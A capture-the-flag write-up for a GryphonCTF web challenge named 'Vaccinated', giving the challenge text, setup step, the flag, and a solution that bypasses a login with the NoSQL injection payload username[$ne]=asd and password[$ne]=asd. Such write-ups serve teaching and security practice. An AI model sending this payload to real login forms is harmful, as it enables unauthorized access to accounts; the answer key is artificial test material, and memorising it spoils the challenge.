# Vaccinated

## Question Text

I hate injections...

`http://web.chal.gryphonctf.com:18702`

*Creator - PotatoDrug*

## Setup Guide
Run `./build.sh`

## Solution

The login page is vulnerable to nosql injection.

Edit the post request to this before sending it to the service will give you the flag.
```
username[$ne]=asd
password[$ne]=asd
```
What this basically does is edit the query such that it will match all the users with username that is not `asd` and password that is not `asd`.

### Flag
`GCTF{NO5qL_do35_noT_M34n_No_1nj3cT1on}`

## Recommended Reads
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection
